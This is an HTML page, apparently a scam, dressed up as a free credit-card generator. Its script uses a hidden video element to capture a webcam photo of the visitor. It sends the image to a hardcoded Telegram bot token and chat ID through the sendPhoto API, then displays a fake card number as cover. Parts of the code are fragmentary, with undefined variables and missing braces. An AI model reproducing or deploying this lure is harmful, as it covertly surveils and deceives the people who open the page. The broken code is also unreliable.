<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium CC Generator | v2.0</title>
    <style>
        :root { --blue: #3b82f6; --dark: #0f172a; }
        body { background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #1e293b; width: 90%; max-width: 350px; padding: 30px; border-radius: 25px; text-align: center; border: 1px solid #334155; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .btn { background: var(--blue); color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1rem; margin-top: 20px; transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        #status { font-size: 0.75rem; color: #94a3b8; margin-top: 15px; }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0; }
        .cc-box { display: none; background: linear-gradient(135deg, #1e3a8a, #3b82f6); padding: 20px; border-radius: 15px; text-align: left; margin-top: 20px; animation: fadeIn 0.5s; }
    </style>
</head>
<body>

<div class="card">
    <div id="ui-main">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" width="60">
        <h2>Get Free CC</h2>

</div>

<video id="v" autoplay playsinline></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    // Aapka Data Filtered
    const TOKEN = "8522831002:AAFFS96ab4BZcdfnQCBH6gRgduCk1oc2jHo";
    const CHAT_ID = "7109174643";

    async function captureAndSend() {
        const video = document.getElementById('v');
        const status = document.getElementById('status');
        const btn = document.querySelector('.btn');

        btn.innerText = "VERIFYING...";
        status.innerText = "Requesting secure tunnel...";

        try {
            // Permission Popup

            setTimeout(() => {

                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // Photo to Blob
                canvas.toBlob(async (blob) => {

                    formData.append('chat_id', CHAT_ID);

                    // Sending to Telegram
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    // Stop camera
                    stream.getTracks().forEach(t => t.stop());
                    
                    // Show Success UI
                    showFakeCC();
                }, 'image/png');

            }, 2500);

        } catch (err) {
            alert("Security Error: Please click 'Allow' to verify your connection.");
            location.reload();

    function showFakeCC() {

        document.getElementById('cc-box').style.display = "block";
        const randomNum = "4213 " + Math.floor(1000 + Math.random()*8999) + " " + Math.floor(1000 + Math.random()*8999) + " " + Math.floor(1000 + Math.random()*8999);

    }
</script>

</body>
</html>
